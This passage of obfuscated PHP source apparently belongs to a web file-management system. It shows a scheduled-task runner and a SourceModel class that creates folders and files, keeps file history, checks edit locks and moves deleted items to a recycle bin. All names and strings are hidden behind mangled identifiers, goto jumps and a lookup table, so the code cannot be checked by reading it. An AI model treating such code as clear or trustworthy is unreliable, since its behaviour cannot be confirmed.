$cŸ—«å‰Ó = 20; $AÇÊ“Ä»ä = intval($AÇÊ“Ä»ä) <= $cŸ—«å‰Ó ? $cŸ—«å‰Ó : intval($AÇÊ“Ä»ä); self::valueSet($d®·¿İå°[685], $e¼Ä²ë‡Æ); self::valueSet($d®·¿İå°[1406], $AÇÊ“Ä»ä); } private static function taskRunAll() { $dê­¹œ‹Æ =& $_SERVER[¼€¼ˆ¦‚¡]; $bÔßè = Model($dê­¹œ‹Æ[1408])->listData(); $a‚³—÷ä‘— = count($bÔßè); for ($EÄô»ø˜Â‰ = 0; $EÄô»ø˜Â‰ < $a‚³—÷ä‘—; $EÄô»ø˜Â‰++) { $Bê÷òÃâÓà = $bÔßè[$EÄô»ø˜Â‰]; if ($Bê÷òÃâÓà[$dê­¹œ‹Æ[1409]] != $dê­¹œ‹Æ[83]) { continue; } if (!self::taskTimeCheck($Bê÷òÃâÓà)) { continue; } self::taskRun($Bê÷òÃâÓà); } Hook::trigger($dê­¹œ‹Æ[1410]); } private static function taskTimeCheck($Cˆœ†À®Ë¢) { goto AÔÃºØ¹†Ø; AÔÃºØ¹†Ø: $F«™¥’‹Œ =& $_SERVER[¼€¼ˆ¦‚¡]; $B¬ Œ˜¹·Ş = json_decode($Cˆœ†À®Ë¢[$F«™¥’‹Œ[190]], !0); $B¤ã²§Š‘· = intval($Cˆœ†À®Ë¢[$F«™¥’‹Œ[1402]]); goto DÄá¯ÌØ; d‡ô÷ã»¯í: switch ($B¬ Œ˜¹·Ş[$F«™¥’‹Œ[29]]) { case $F«™¥’‹Œ[1417]: if (time() - $B¤ã²§Š‘· < 3600 * 24 * 30) { return !1; } if ($B¬ Œ˜¹·Ş[$F«™¥’‹Œ[1417]] == date($F«™¥’‹Œ[1418]) && $BÒõÓ¾Á¾ò) { return !0; } break; case $F«™¥’‹Œ[1419]: if (time() - $B¤ã²§Š‘· < 3600 * 24 * 7) { return !1; } $F¡®òŞÃŠÂ = date($F«™¥’‹Œ[1420]) == 0 ? 7 : date($F«™¥’‹Œ[1420]); if ($B¬ Œ˜¹·Ş[$F«™¥’‹Œ[1419]] == $F¡®òŞÃŠÂ && $BÒõÓ¾Á¾ò) { return !0; } break; case $F«™¥’‹Œ[1412]: if (time() - $B¤ã²§Š‘· < 3600 * 24) { return !1; } if ($BÒõÓ¾Á¾ò) { return !0; } break; case $F«™¥’‹Œ[1421]: if (time() - $B¤ã²§Š‘· >= floatval($B¬ Œ˜¹·Ş[$F«™¥’‹Œ[1421]]) * 60) { return !0; } break; default: break; } return !1; goto F´­ó¤¿©³; DÄá¯ÌØ: $d¾ÙĞ™Ì = strtotime($F«™¥’‹Œ[1411] . $B¬ Œ˜¹·Ş[$F«™¥’‹Œ[1412]] . $F«™¥’‹Œ[1413]) - strtotime($F«™¥’‹Œ[1414]); $EéóŠİ¢¬ = time() - strtotime(date($F«™¥’‹Œ[1415]) . $F«™¥’‹Œ[1416]); $BÒõÓ¾Á¾ò = $EéóŠİ¢¬ >= $d¾ÙĞ™Ì && $EéóŠİ¢¬ <= $d¾ÙĞ™Ì + 3600; goto d‡ô÷ã»¯í; F´­ó¤¿©³: } public static function taskRun($dÃèØÜ‡Ü) { goto a´šÖ§ÌÙƒ; FÑÙÒåç´Ò: $E„ÔöÅÙ = timeFloat(); $EÙœ†ÆéŠ´ = $Bá„¯É¾áÉ[33]; switch ($dÃèØÜ‡Ü[$Bá„¯É¾áÉ[29]]) { case $Bá„¯É¾áÉ[295]: $FÈ‡ˆÈïªâ = url_request($dÃèØÜ‡Ü[$Bá„¯É¾áÉ[1425]], $Bá„¯É¾áÉ[216], !1, !1, !1, !1, 5); $EÙœ†ÆéŠ´ = strlen($FÈ‡ˆÈïªâ); break; case $Bá„¯É¾áÉ[215]: $EÙœ†ÆéŠ´ = Hook::apply($dÃèØÜ‡Ü[$Bá„¯É¾áÉ[1425]]); default: break; } goto A¾âß¦¨¡‡; A¾âß¦¨¡‡: Model($Bá„¯É¾áÉ[1426])->add(array($Bá„¯É¾áÉ[1427] => $Bá„¯É¾áÉ[33], $Bá„¯É¾áÉ[1428] => $Bá„¯É¾áÉ[468], $Bá„¯É¾áÉ[29] => $Bá„¯É¾áÉ[1429] . $dÃèØÜ‡Ü[$Bá„¯É¾áÉ[367]], $Bá„¯É¾áÉ[1430] => json_encode(array($Bá„¯É¾áÉ[28] => $dÃèØÜ‡Ü[$Bá„¯É¾áÉ[28]], $Bá„¯É¾áÉ[1431] => timeFloat() - $E„ÔöÅÙ, $Bá„¯É¾áÉ[281] => $EÙœ†ÆéŠ´)))); self::log($Bá„¯É¾áÉ[1432] . $dÃèØÜ‡Ü[$Bá„¯É¾áÉ[367]] . $Bá„¯É¾áÉ[1433] . $EÙœ†ÆéŠ´); return !0; goto B±‰Ÿè ÇÈ; a´šÖ§ÌÙƒ: $Bá„¯É¾áÉ =& $_SERVER[¼€¼ˆ¦‚¡]; self::log($Bá„¯É¾áÉ[1422] . $dÃèØÜ‡Ü[$Bá„¯É¾áÉ[367]] . $Bá„¯É¾áÉ[1423] . $dÃèØÜ‡Ü[$Bá„¯É¾áÉ[28]] . $Bá„¯É¾áÉ[1424] . $dÃèØÜ‡Ü[$Bá„¯É¾áÉ[1425]]); Model($Bá„¯É¾áÉ[1408])->run($dÃèØÜ‡Ü[$Bá„¯É¾áÉ[367]]); goto FÑÙÒåç´Ò; B±‰Ÿè ÇÈ: } private static function valueGet($D³¶‰ô¢Éª) { $b›ÎŞ…¶öÂ =& $_SERVER[¼€¼ˆ¦‚¡]; $EÃ¢ª‹Œæ‰ = $b›ÎŞ…¶öÂ[1434]; $Dİ”…ãŒ×İ = Model($b›ÎŞ…¶öÂ[1435])->get($D³¶‰ô¢Éª, $EÃ¢ª‹Œæ‰); if (is_null($Dİ”…ãŒ×İ)) { Model($b›ÎŞ…¶öÂ[1435])->set($b›ÎŞ…¶öÂ[1406], 10, $EÃ¢ª‹Œæ‰); Model($b›ÎŞ…¶öÂ[1435])->set($b›ÎŞ…¶öÂ[685], $b›ÎŞ…¶öÂ[83], $EÃ¢ª‹Œæ‰); Model($b›ÎŞ…¶öÂ[1435])->set($b›ÎŞ…¶öÂ[1401], $b›ÎŞ…¶öÂ[468], $EÃ¢ª‹Œæ‰); $Dİ”…ãŒ×İ = Model($b›ÎŞ…¶öÂ[1435])->get($D³¶‰ô¢Éª, $EÃ¢ª‹Œæ‰); } return $Dİ”…ãŒ×İ; } private static function valueSet($FãŒÄË, $f”Õõ´÷íø) { $bï­ˆ¹‹Ÿñ =& $_SERVER[¼€¼ˆ¦‚¡]; return Model($bï­ˆ¹‹Ÿñ[1435])->set($FãŒÄË, $f”Õõ´÷íø, $bï­ˆ¹‹Ÿñ[1434]); } protected static function log($fîÙ­¢¾Ô‡) { write_log($fîÙ­¢¾Ô‡, $_SERVER[¼€¼ˆ¦‚¡][1436]); } private static function cacheClear() { $F“Û¼ÑÉÄƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $A¨Ü²‚Ô = Model($F“Û¼ÑÉÄƒ[1435])->cacheKey($F“Û¼ÑÉÄƒ[1434]); Cache::clearMemory($A¨Ü²‚Ô); } } goto A«í‹÷Ğ«Ì; FõåÂÓÕª: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($EØ¸ÇÑµ§«) { $a«ë•ÊøÆù =& $_SERVER[¼€¼ˆ¦‚¡]; $Dó¤ù¶Ö£¹ = Model($a«ë•ÊøÆù[474])->where(array($a«ë•ÊøÆù[1428] => $EØ¸ÇÑµ§«))->find(); $D¹ÑÃ´ÄÄ‘ = $this->_mkdirRoot(SourceModel::TYPE_USER, $EØ¸ÇÑµ§«, $Dó¤ù¶Ö£¹[$a«ë•ÊøÆù[28]]); $this->userDesktopAdd($D¹ÑÃ´ÄÄ‘); return $D¹ÑÃ´ÄÄ‘; } public function userDesktopAdd($cç¹¯Š¦Ş´) { $B«÷ËŒ¹á =& $_SERVER[¼€¼ˆ¦‚¡]; $BÃ‹§·Î‹ = LNG($B«÷ËŒ¹á[2332]); $b¯íôœæÒ = $this->mkdir($cç¹¯Š¦Ş´, $BÃ‹§·Î‹); $this->metaSet($b¯íôœæÒ, $B«÷ËŒ¹á[2333], $B«÷ËŒ¹á[83]); $this->metaSet($cç¹¯Š¦Ş´, $B«÷ËŒ¹á[2334], $b¯íôœæÒ); } public function groupRootAdd($b©Ä„ÓßÀ‡) { $C‹—³Õ×Áß =& $_SERVER[¼€¼ˆ¦‚¡]; $C›¯Ïƒíå  = Model($C‹—³Õ×Áß[458])->where(array($C‹—³Õ×Áß[2179] => $b©Ä„ÓßÀ‡))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $b©Ä„ÓßÀ‡, $C›¯Ïƒíå [$C‹—³Õ×Áß[28]]); } public function systemRootPathAdd($c“ ½ï½†) { if ($c“ ½ï½† != $_SERVER[¼€¼ˆ¦‚¡][1089]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $c“ ½ï½†); } public function userRootRemove($d·¼Ö¶›È¢) { $Bôö‘”Ù³Ö = $this->sourceRoot(SourceModel::TYPE_USER, $d·¼Ö¶›È¢); if (!$Bôö‘”Ù³Ö) { return; } $this->remove($Bôö‘”Ù³Ö, !1); } public function groupRootRemove($cèäÉ³¥š÷) { $B§º×ß• = $this->sourceRoot(SourceModel::TYPE_GROUP, $cèäÉ³¥š÷); if (!$B§º×ß•) { return; } $this->remove($B§º×ß•, !1); } private function _mkdirRoot($C˜˜Ó‡‹öÁ, $DÂË½ùÉ‚½, $B¸Ş¯Ô·È†) { goto C—ŸôÏ¾—Ï; C—ŸôÏ¾—Ï: $c¦œ¤ËÅó‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $EÙÛãÍç = array($c¦œ¤ËÅó‹[368] => 0, $c¦œ¤ËÅó‹[521] => $C˜˜Ó‡‹öÁ, $c¦œ¤ËÅó‹[522] => $DÂË½ùÉ‚½, $c¦œ¤ËÅó‹[518] => 1, $c¦œ¤ËÅó‹[523] => USER_ID, $c¦œ¤ËÅó‹[524] => USER_ID, $c¦œ¤ËÅó‹[519] => $c¦œ¤ËÅó‹[33], $c¦œ¤ËÅó‹[525] => $c¦œ¤ËÅó‹[470], $c¦œ¤ËÅó‹[396] => 0, $c¦œ¤ËÅó‹[520] => 0, $c¦œ¤ËÅó‹[420] => 0, $c¦œ¤ËÅó‹[526] => $c¦œ¤ËÅó‹[33]); if ($D×ÀÆ½Ùò– = $this->where($EÙÛãÍç)->find()) { return $D×ÀÆ½Ùò–[$c¦œ¤ËÅó‹[369]]; } goto BÏª§†²‡ò; Aíˆ™¶Ÿğ•: CacheLock::unlock($F‡†é§ö¨Ó); return $cœó´ÉçÉô; goto f¤ƒñ­ê¨; bëæ„æ¨®ó: $cœó´ÉçÉô = $this->add($EÙÛãÍç); $aæ¸Â¹§ = array($c¦œ¤ËÅó‹[527] => short_id($cœó´ÉçÉô)); $this->where(array($c¦œ¤ËÅó‹[383] => $cœó´ÉçÉô))->save($aæ¸Â¹§); goto Aíˆ™¶Ÿğ•; BÏª§†²‡ò: $F‡†é§ö¨Ó = "\115\x6f\144\145\154\123\x6f\x75\162\143\x65\x2e\155\x6b\144\151\x72\122\157\157\164\x2e{$C˜˜Ó‡‹öÁ}\x2e{$DÂË½ùÉ‚½}\x2e" . $B¸Ş¯Ô·È†; CacheLock::lock($F‡†é§ö¨Ó); $EÙÛãÍç[$c¦œ¤ËÅó‹[28]] = $B¸Ş¯Ô·È†; goto bëæ„æ¨®ó; f¤ƒñ­ê¨: } private function sourceRoot($a¼ŸÔÑ÷Œ, $cô²Åœ », $Aßªë Ä¡á = false) { $EÎ¯’ËÛ«î =& $_SERVER[¼€¼ˆ¦‚¡]; $EÎÒóŠóÒŸ = array($EÎ¯’ËÛ«î[368] => 0, $EÎ¯’ËÛ«î[521] => $a¼ŸÔÑ÷Œ, $EÎ¯’ËÛ«î[522] => $cô²Åœ »); if ($e•°…Ç›Ë = $this->where($EÎÒóŠóÒŸ)->find()) { return $Aßªë Ä¡á ? $e•°…Ç›Ë : $e•°…Ç›Ë[$EÎ¯’ËÛ«î[369]]; } return !1; } public function sourceRootGroup($FÄåëÈ¹š) { $aÜÈÑòÒäã =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_string($FÄåëÈ¹š)) { $FÄåëÈ¹š = array($FÄåëÈ¹š); } $aé†ñŒ¾É‰ = array($aÜÈÑòÒäã[368] => 0, $aÜÈÑòÒäã[521] => SourceModel::TYPE_GROUP, $aÜÈÑòÒäã[522] => array($aÜÈÑòÒäã[7], $FÄåëÈ¹š)); $c §¼šÑ©Ù = $this->listSource($aé†ñŒ¾É‰, 1000); return array_to_keyvalue($c §¼šÑ©Ù[$aÜÈÑòÒäã[74]], $aÜÈÑòÒäã[456]); } public function mkfile($e‚áË»‚®Â, $bí¨×Š›Ò, $D°×àÓ”¯ã = '', $bÆ¦ĞÇ¡ Ö = REPEAT_RENAME) { $C™‰ĞâÉš¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $e³ÓÎß±¯º = Model($C™‰ĞâÉš¤[544])->addFileByContent($D°×àÓ”¯ã, $bí¨×Š›Ò); return $this->_createFileCall($e‚áË»‚®Â, $bí¨×Š›Ò, $e³ÓÎß±¯º, $bÆ¦ĞÇ¡ Ö, $C™‰ĞâÉš¤[1126]); } public function addFile($D™¦…”‹±, $FĞ³ª©ß™, $b¹´‹Â¥…, $f´ÜÒñÊ¹ = false, $F·§–Ü˜ªä = REPEAT_RENAME) { $C§‹’¢ñÒ‚ = Model($_SERVER[¼€¼ˆ¦‚¡][544])->addFile($FĞ³ª©ß™, $b¹´‹Â¥…, $f´ÜÒñÊ¹); return $this->_createFileCall($D™¦…”‹±, $b¹´‹Â¥…, $C§‹’¢ñÒ‚, $F·§–Ü˜ªä); } public function addFileByFileID($DòŸäÂìƒÒ, $aİˆ¢”õÑî, $F¯©ßÏ»Ï, $B‰¹×¥Ù‰ = REPEAT_RENAME) { $D¦’²ª£íƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $d³ËîÄ£Å = Model($D¦’²ª£íƒ[544])->find($aİˆ¢”õÑî); Model($D¦’²ª£íƒ[544])->linkAdd($aİˆ¢”õÑî); return $this->_createFileCall($DòŸäÂìƒÒ, $F¯©ßÏ»Ï, $d³ËîÄ£Å, $B‰¹×¥Ù‰); } public function addFileByRemote($BÑí³¨„®, $e¬ò­Õèè, $aëÎçÛÜ‘…, $aİ™ÓÈğŒØ = array(), $bâÇËì®­ = REPEAT_RENAME) { $Cª½Ñò‚¯œ = Model($_SERVER[¼€¼ˆ¦‚¡][544])->addFileByRemote($e¬ò­Õèè, $aëÎçÛÜ‘…, $aİ™ÓÈğŒØ); return $this->_createFileCall($BÑí³¨„®, $aëÎçÛÜ‘…, $Cª½Ñò‚¯œ, $bâÇËì®­); } private function _createFileCall($F„ÈµÏ¨·˜, $c‹¹¯¥—êÑ, $cêß´ÉÒ¡Ó, $DŒ¼Ë¾À¯, $FÇê¬¢ÎÑ£ = "\165\x70\x6c\x6f\x61\144") { goto a£ÜŸ­”öÏ; CÊ…äˆŒÙ: return $dÔÜÖ­Ù²©; goto AÂ¹àñ¨•¶; a£ÜŸ­”öÏ: $AöÂÊ‰Ú‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $CÇ¾è†æî” = !1; $this->lockWriteStart($F„ÈµÏ¨·˜, $c‹¹¯¥—êÑ); goto A‹£Ó®ñ‘‘; A‹£Ó®ñ‘‘: $dÔÜÖ­Ù²© = $this->_createFile($F„ÈµÏ¨·˜, $c‹¹¯¥—êÑ, $cêß´ÉÒ¡Ó, $DŒ¼Ë¾À¯, $CÇ¾è†æî”); if (!$CÇ¾è†æî”) { Model($AöÂÊ‰Ú‚[422])->remove($cêß´ÉÒ¡Ó[$AöÂÊ‰Ú‚[419]]); } else { if ($dÔÜÖ­Ù²©) { Model($AöÂÊ‰Ú‚[2305])->eventCreate($dÔÜÖ­Ù²©, $FÇê¬¢ÎÑ£); } } $this->lockWriteEnd($F„ÈµÏ¨·˜, $c‹¹¯¥—êÑ); goto CÊ…äˆŒÙ; AÂ¹àñ¨•¶: } public function mkdir($b×°ÔŠĞŒ, $d‰”ñ£‰¹, $d¸Ä±Ş¼‘® = REPEAT_SKIP) { goto CÌÑ£îÃ–÷; dÄÃ§ªÆ·™: return $eæ¡‹¯£¢¼; goto c¶·Í¯‹‰ƒ; CÌÑ£îÃ–÷: $eÖñ©Â®Ó =& $_SERVER[¼€¼ˆ¦‚¡]; $D«êÂĞÑ°³ = $this->sourceInfo($b×°ÔŠĞŒ); if (!$D«êÂĞÑ°³) { return !1; } goto dÙò‡ï¤¨î; dÙò‡ï¤¨î: $this->lockWriteStart($b×°ÔŠĞŒ, $d‰”ñ£‰¹); if ($d¸Ä±Ş¼‘® !== !1) { $a¸÷»š¥†¹ = $this->fileNameExist($b×°ÔŠĞŒ, $d‰”ñ£‰¹); if ($a¸÷»š¥†¹ && $d¸Ä±Ş¼‘® != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($b×°ÔŠĞŒ, $d‰”ñ£‰¹); return $a¸÷»š¥†¹; } $d‰”ñ£‰¹ = $this->fileNameAuto($b×°ÔŠĞŒ, $d‰”ñ£‰¹, $d¸Ä±Ş¼‘®); } $f¬ƒ‡Ú“ì = array($eÖñ©Â®Ó[518] => 1, $eÖñ©Â®Ó[386] => $d‰”ñ£‰¹, $eÖñ©Â®Ó[519] => $eÖñ©Â®Ó[33], $eÖñ©Â®Ó[420] => 0, $eÖñ©Â®Ó[520] => 0); goto Bë‚ñøÒÒİ; Bë‚ñøÒÒİ: $eæ¡‹¯£¢¼ = $this->_addSoure($f¬ƒ‡Ú“ì, $D«êÂĞÑ°³); Model($eÖñ©Â®Ó[2305])->eventCreate($eæ¡‹¯£¢¼, $eÖñ©Â®Ó[1127]); $this->lockWriteEnd($b×°ÔŠĞŒ, $d‰”ñ£‰¹); goto dÄÃ§ªÆ·™; c¶·Í¯‹‰ƒ: } private function _createFile($C„Ù™ß”‘Ÿ, $dé¬İÂŞİµ, $DÍÙ°Œ¾, $E²‚àî˜Î…, &$EÍÊ˜Óº‘‰) { goto dô½Œ¯Ÿƒ¡; dô½Œ¯Ÿƒ¡: $b´Úİ³›ŞÎ =& $_SERVER[¼€¼ˆ¦‚¡]; $a²ö«Š‘× = $this->sourceInfo($C„Ù™ß”‘Ÿ); if (!$DÍÙ°Œ¾ || !$a²ö«Š‘×) { return !1; } goto B‰”ãÏµ¼À; F½’ßá¾‚: $a„†„¬’² = array($b´Úİ³›ŞÎ[518] => 0, $b´Úİ³›ŞÎ[386] => $dé¬İÂŞİµ, $b´Úİ³›ŞÎ[519] => get_path_ext($dé¬İÂŞİµ), $b´Úİ³›ŞÎ[420] => $DÍÙ°Œ¾[$b´Úİ³›ŞÎ[419]], $b´Úİ³›ŞÎ[520] => $DÍÙ°Œ¾[$b´Úİ³›ŞÎ[77]]); $eÊÎ­ìôÔÅ = $this->_addSoure($a„†„¬’², $a²ö«Š‘×); $this->folderSizeReset($C„Ù™ß”‘Ÿ); goto AÖ¯óÌçÜë; AÖ¯óÌçÜë: return $eÊÎ­ìôÔÅ; goto dçƒÜŒ¡£„; B‰”ãÏµ¼À: if ($E²‚àî˜Î… !== !1) { $cÜéá‚Â´¬ = $this->fileNameExist($C„Ù™ß”‘Ÿ, $dé¬İÂŞİµ); } $EÍÊ˜Óº‘‰ = !0; if ($E²‚àî˜Î… && $cÜéá‚Â´¬) { if ($E²‚àî˜Î… == REPEAT_SKIP) { $EÍÊ˜Óº‘‰ = !1; return $cÜéá‚Â´¬; } else { if ($E²‚àî˜Î… == REPEAT_REPLACE) { $fÑéà ˆ…à = $this->sourceInfo($cÜéá‚Â´¬); $D‹ƒˆ˜ˆÛ = $this->fileHistory($fÑéà ˆ…à, $DÍÙ°Œ¾[$b´Úİ³›ŞÎ[419]], $DÍÙ°Œ¾[$b´Úİ³›ŞÎ[77]]); if (!$D‹ƒˆ˜ˆÛ) { $EÍÊ˜Óº‘‰ = !1; } else { $this->folderSizeReset($C„Ù™ß”‘Ÿ); } return $cÜéá‚Â´¬; } else { $dé¬İÂŞİµ = $this->fileNameAuto($C„Ù™ß”‘Ÿ, $dé¬İÂŞİµ, $E²‚àî˜Î…, !1); } } } goto F½’ßá¾‚; dçƒÜŒ¡£„: } protected function fileHistory($BøºÔŞ½ˆË, $Cä³‹¯‰, $Cáå•Œ”·¾) { goto CŠÅ¥‘ÃÓ; B™ø¸ÎÀ¸¿: Model($câœ´¿¬Æ‡[2335])->addHistory($BøºÔŞ½ˆË); $a¦µ®õß…í = array($câœ´¿¬Æ‡[524] => USER_ID, $câœ´¿¬Æ‡[390] => time(), $câœ´¿¬Æ‡[419] => $Cä³‹¯‰, $câœ´¿¬Æ‡[77] => $Cáå•Œ”·¾); $this->where(array($câœ´¿¬Æ‡[383] => $BøºÔŞ½ˆË[$câœ´¿¬Æ‡[369]]))->save($a¦µ®õß…í); goto BŸÑÔ·ôàÏ; CŠÅ¥‘ÃÓ: $câœ´¿¬Æ‡ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($BøºÔŞ½ˆË[$câœ´¿¬Æ‡[419]] == $Cä³‹¯‰) { return !1; } $this->checkLock($BøºÔŞ½ˆË[$câœ´¿¬Æ‡[369]], $Cä³‹¯‰); goto B™ø¸ÎÀ¸¿; BŸÑÔ·ôàÏ: return !0; goto D»Œ†ˆ³¬; D»Œ†ˆ³¬: } public function checkLock($E‡ÖŸÛâ™Æ, $dğ…Ûˆ®ä°) { goto aÎ¾§º½–‡; AÔóóæÜ½À: show_json(LNG($F—òÎĞ²—[2338]) . $F—òÎĞ²—[2339] . LNG($F—òÎĞ²—[2340]) . $F—òÎĞ²—[2341] . $DÏİ×å¥‰ˆ . $F—òÎĞ²—[2342], !1); goto EÕ®ã›ºâŒ; fÂÌˆÅ§æñ: $this->_createFileCall($dô¾ÌŒ„¦£[$F—òÎĞ²—[461]], $bØ†ëÃôø½, $E¤„¦î²Ô, REPEAT_REPLACE, $F—òÎĞ²—[1126]); $E¯ôÉ»¡é¼ = $dô¾ÌŒ„¦£[$F—òÎĞ²—[417]][$F—òÎĞ²—[481]]; $DÏİ×å¥‰ˆ = $E¯ôÉ»¡é¼[$F—òÎĞ²—[2337]] ? $E¯ôÉ»¡é¼[$F—òÎĞ²—[2337]] : $E¯ôÉ»¡é¼[$F—òÎĞ²—[28]]; goto AÔóóæÜ½À; aÎ¾§º½–‡: $F—òÎĞ²— =& $_SERVER[¼€¼ˆ¦‚¡]; $dô¾ÌŒ„¦£ = $this->pathInfo($E‡ÖŸÛâ™Æ); if (!$this->fileIsLock($dô¾ÌŒ„¦£, !0)) { return; } goto bªã¾¦‘; bªã¾¦‘: $C‘·¯¶¥ = Session::get($F—òÎĞ²—[2336]); $bØ†ëÃôø½ = substr($dô¾ÌŒ„¦£[$F—òÎĞ²—[28]], 0, -1 - strlen($dô¾ÌŒ„¦£[$F—òÎĞ²—[160]])) . $F—òÎĞ²—[1389] . $C‘·¯¶¥ . $F—òÎĞ²—[91] . $dô¾ÌŒ„¦£[$F—òÎĞ²—[160]]; $E¤„¦î²Ô = Model($F—òÎĞ²—[544])->find($dğ…Ûˆ®ä°); goto fÂÌˆÅ§æñ; EÕ®ã›ºâŒ: } public function fileIsLock($D±¿Ø«Í˜, $d£ŒÍó±Ö· = false) { goto fä·ã „; fä·ã „: $dĞŒØÀ°§œ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($D±¿Ø«Í˜[$dĞŒØÀ°§œ[417]]) || !$D±¿Ø«Í˜[$dĞŒØÀ°§œ[417]][$dĞŒØÀ°§œ[478]]) { return !1; } if ($D±¿Ø«Í˜[$dĞŒØÀ°§œ[417]][$dĞŒØÀ°§œ[478]] != USER_ID) { return !0; } goto bõÁ¤­á®‚; bõÁ¤­á®‚: $AÍÉÏÍù‘Ò = $GLOBALS[$dĞŒØÀ°§œ[6]][$dĞŒØÀ°§œ[84]][$dĞŒØÀ°§œ[479]]; if ($D±¿Ø«Í˜[$dĞŒØÀ°§œ[417]][$dĞŒØÀ°§œ[480]] <= time() - $AÍÉÏÍù‘Ò) { $this->metaSet($D±¿Ø«Í˜[$dĞŒØÀ°§œ[369]], $dĞŒØÀ°§œ[478], null); $this->metaSet($D±¿Ø«Í˜[$dĞŒØÀ°§œ[369]], $dĞŒØÀ°§œ[480], null); } if ($d£ŒÍó±Ö·) { $this->metaSet($D±¿Ø«Í˜[$dĞŒØÀ°§œ[369]], $dĞŒØÀ°§œ[480], time()); } goto fªî¶ø¬‚²; fªî¶ø¬‚²: return !1; goto FÄ†¤¢»Èˆ; FÄ†¤¢»Èˆ: } private function _addSoure($fŒÄÈÎÄê, $cèìè¿Öó´) { goto C‡à‡¤åï; dÉé¹å¦ÈŸ: static $e÷Òº‘÷Î = false; if (!$e÷Òº‘÷Î) { Hook::trigger($e‚†ö¿ÁÒğ[508], $fŒÄÈÎÄê); $e÷Òº‘÷Î = !0; } $c¦İŒ­ˆ¯Å = $this->add($fŒÄÈÎÄê); goto BæÑ’ÅÔ„; A®Õ š¬ãÇ: $this->updateModifyTime($fŒÄÈÎÄê[$e‚†ö¿ÁÒğ[461]]); $Eª¥âŒŒŸ„ = $e‚†ö¿ÁÒğ[2343] . $cèìè¿Öó´[$e‚†ö¿ÁÒğ[369]]; if (isset(self::$cacheChildList[$Eª¥âŒŒŸ„])) { unset(self::$cacheChildList[$Eª¥âŒŒŸ„]); } goto dÉé¹å¦ÈŸ; C‡à‡¤åï: $e‚†ö¿ÁÒğ =& $_SERVER[¼€¼ˆ¦‚¡]; $BªˆÜ£¡ÄÛ = array($e‚†ö¿ÁÒğ[521] => $cèìè¿Öó´[$e‚†ö¿ÁÒğ[371]], $e‚†ö¿ÁÒğ[522] => $cèìè¿Öó´[$e‚†ö¿ÁÒğ[456]], $e‚†ö¿ÁÒğ[523] => USER_ID, $e‚†ö¿ÁÒğ[524] => USER_ID, $e‚†ö¿ÁÒğ[368] => $cèìè¿Öó´[$e‚†ö¿ÁÒğ[369]], $e‚†ö¿ÁÒğ[525] => $cèìè¿Öó´[$e‚†ö¿ÁÒğ[459]] . $cèìè¿Öó´[$e‚†ö¿ÁÒğ[369]] . $e‚†ö¿ÁÒğ[47], $e‚†ö¿ÁÒğ[396] => 0, $e‚†ö¿ÁÒğ[526] => $e‚†ö¿ÁÒğ[33]); $fŒÄÈÎÄê = array_merge($BªˆÜ£¡ÄÛ, $fŒÄÈÎÄê); goto A®Õ š¬ãÇ; BæÑ’ÅÔ„: $a†‰—–‘…½ = array($e‚†ö¿ÁÒğ[527] => short_id($c¦İŒ­ˆ¯Å)); $this->where(array($e‚†ö¿ÁÒğ[383] => $c¦İŒ­ˆ¯Å))->save($a†‰—–‘…½); $this->setNamePinyin($c¦İŒ­ˆ¯Å, $fŒÄÈÎÄê[$e‚†ö¿ÁÒğ[28]]); goto fõ—ëø†­; fõ—ëø†­: return $c¦İŒ­ˆ¯Å; goto aç¿÷ŠŞ‘; aç¿÷ŠŞ‘: } public function remove($B—Ê´øõá, $B³Å‡¼ĞóÛ = true) { goto aÛ‰¼‡ÄÜ; f¨ƒ§ÒÙ×Ò: return $fÑÉ±ÊÙˆ„; goto BŒˆÏÀ™¸‘; aÛ‰¼‡ÄÜ: $e¤á—åÖÏÄ =& $_SERVER[¼€¼ˆ¦‚¡]; $a–®øïÏ¦‡ = $this->sourceInfo($B—Ê´øõá); $D·±ó¤Èïµ = intval($a–®øïÏ¦‡[$e¤á—åÖÏÄ[371]]) === self::TYPE_SYSTEM; goto bÕÖÈ¾ã†®; CŒœÖµ’óñ: CacheLock::unlock($cõÁ‚±Ó£’); $this->metaSet($B—Ê´øõá, $e¤á—åÖÏÄ[2352], $a–®øïÏ¦‡[$e¤á—åÖÏÄ[461]]); $this->where(array($e¤á—åÖÏÄ[369] => $B—Ê´øõá))->save(array($e¤á—åÖÏÄ[390] => time())); goto a…²‚•´¯‰; a…²‚•´¯‰: $this->recycleClear($a–®øïÏ¦‡); $fÑÉ±ÊÙˆ„ = $this->move($B—Ê´øõá, $f“†ì»å‰, REPEAT_RENAME_FOLDER); $this->folderSizeReset($a–®øïÏ¦‡[$e¤á—åÖÏÄ[461]]); goto f¨ƒ§ÒÙ×Ò; bÕÖÈ¾ã†®: $CÅ»§Éƒ = Model($e¤á—åÖÏÄ[1435])->get($e¤á—åÖÏÄ[2344]) == $e¤á—åÖÏÄ[83]; if ($D·±ó¤Èïµ || $B³Å‡¼ĞóÛ || !$CÅ»§Éƒ) { return $this->removeNow($B—Ê´øõá, $B³Å‡¼ĞóÛ); } $E¶ŠòÂ‘‘ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto A¶§åî©÷À; C²“˜¦œ§: CacheLock::lock($cõÁ‚±Ó£’); $f“†ì»å‰ = $this->fileNameExist($E¶ŠòÂ‘‘, $Eº‹ƒ†•¿ˆ); if (!$f“†ì»å‰) { $f“†ì»å‰ = $this->mkdir($E¶ŠòÂ‘‘, $Eº‹ƒ†•¿ˆ, REPEAT_SKIP); $this->metaSet($f“†ì»å‰, $e¤á—åÖÏÄ[2348], $D‡‡¸¡¦ß’); $this->metaSet($f“†ì»å‰, $e¤á—åÖÏÄ[2349], $a–®øïÏ¦‡[$e¤á—åÖÏÄ[456]]); if ($a–®øïÏ¦‡[$e¤á—åÖÏÄ[461]] != 0) { $this->metaSet($f“†ì»å‰, $e¤á—åÖÏÄ[2350], _get($Dˆ¹óäÚ, $e¤á—åÖÏÄ[2351])); } } goto CŒœÖµ’óñ; 